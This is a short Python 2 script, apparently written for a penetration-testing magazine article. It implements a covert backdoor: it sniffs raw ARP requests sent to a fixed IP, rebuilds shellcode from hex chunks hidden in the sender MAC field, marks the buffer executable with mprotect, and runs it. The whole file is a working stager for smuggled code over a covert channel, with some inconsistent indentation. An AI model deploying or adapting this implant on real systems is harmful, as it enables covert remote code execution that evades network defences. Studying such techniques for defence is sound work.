#!/usr/bin/env python
# Author: Boumediene KADDOUR - OSCP, OSWP
# Created for learning purposes and Pentest Magazine article contribution

from threading import Thread
from socket import socket,PF_PACKET,SOCK_RAW,htons,inet_ntoa
from struct import unpack
from ctypes import CDLL,c_char_p,c_void_p,memmove,CFUNCTYPE,cast
from thread import start_new_thread
from binascii import hexlify

payload = ""

class ARPSniffer(Thread):
	def __init__(self ):
                Thread.__init__(self)
		self.arpsock = socket(PF_PACKET, SOCK_RAW, htons(0x0806))
                self.PROT_READ = 1
                self.PROT_WRITE = 2
                self.PROT_EXEC = 4
		try:
			self.arpdata = self.arpsock.recv(65535)
		except socket.timeout:
			pass

        def shellExec(self,buffer):
            libc = CDLL('libc.so.6')
            buf = c_char_p(buffer)
            size = len(buffer)
            addr = libc.valloc(size)
            addr = c_void_p(addr)
            if 0 == addr:  
                raise Exception("Failed to allocate memory")
            memmove(addr, buffer, size)
            if 0 != libc.mprotect(addr, len(buffer), self.PROT_READ | self.PROT_WRITE | self.PROT_EXEC):
                raise Exception("Failed to set protection on buffer")
            return addr


	def run(self):
                global payload
		try:
			arp_header = unpack('!2s2s1s1s2s6s4s6s4s', self.arpdata[14:42])
			if hexlify(arp_header[4]) == "0001" and inet_ntoa(arp_header[8])=="172.16.122.20":
			    try:
                                 chunk = hexlify(arp_header[7])
                                 payload += chunk
                                 print "Payload :", chunk
                                 if chunk.endswith("90"):
                                    memorywithshell = self.shellExec("".join(chr(int(payload[i:i+2],16)) for i in xrange(0,len(payload),2)))
            			    shell = cast(memorywithshell, CFUNCTYPE(c_void_p))
			            start_new_thread(shell(),())
		            except:
				pass
		except:
		    pass

def main():
	while True:
	   try:
		IDS = ARPSniffer()
                IDS.setDaemon(True)
                IDS.start()
	   except KeyboardInterrupt:
		break
if __name__ == "__main__":
	main()
